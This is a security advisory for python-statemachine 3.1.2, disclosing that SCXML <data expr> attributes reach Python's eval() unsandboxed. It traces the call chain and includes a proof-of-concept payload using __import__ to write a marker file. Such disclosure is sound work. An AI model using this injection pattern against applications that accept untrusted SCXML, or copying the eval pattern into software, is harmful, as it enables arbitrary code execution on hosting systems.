summary: python-statemachine SCXML <data expr> Eval Injection
details: "### Summary\n\npython-statemachine 3.1.2 evaluates `<data expr=\"...\">`
  attributes in SCXML documents using Python's `eval()`. Any application that passes
  attacker-controlled SCXML content to `SCXMLProcessor` is vulnerable to arbitrary
  code execution in the context of the hosting process.\n\n### Details\n\n`SCXMLProcessor.parse_scxml_file()`
  processes SCXML documents and evaluates `<data>` element `expr` attributes via the
  following call chain:\n\n```\nSCXMLProcessor.parse_scxml_file()\nSCXMLProcessor.process_definition()\n
  create_datamodel_action_callable()\n_create_dataitem_callable()\n_eval()\neval()\n
  ```\n\n`_eval()` calls Python's built-in `eval()` directly on the expression string
  without sandboxing or restriction.\n\n### PoC\n\n```\n1. Install:\n   pip install
  python-statemachine==3.1.2\n\n2. Create an SCXML file containing:\n   <data id=\"\
  x\" expr=\"__import__('pathlib').Path('marker.txt').write_text('pwned')\"/>\n\n
  3. Run:\n   SCXMLProcessor.parse_scxml_file(DATA_EXPR_CHART)\n   SCXMLProcessor.start()\n
  \n4. During start(), <data expr> reaches _eval(), which calls eval().\n\n5. Result:\n\
  \   data_marker_before_start: False\n   data_marker_after_start: True\n   success:
  True\n```\n\n### Impact\n\nThis is an eval injection vulnerability (CWE-95). Remote
  or local code execution depending on whether the consuming application accepts SCXML
  content from remote users, uploaded files, configuration, plugins, or other untrusted
  sources."
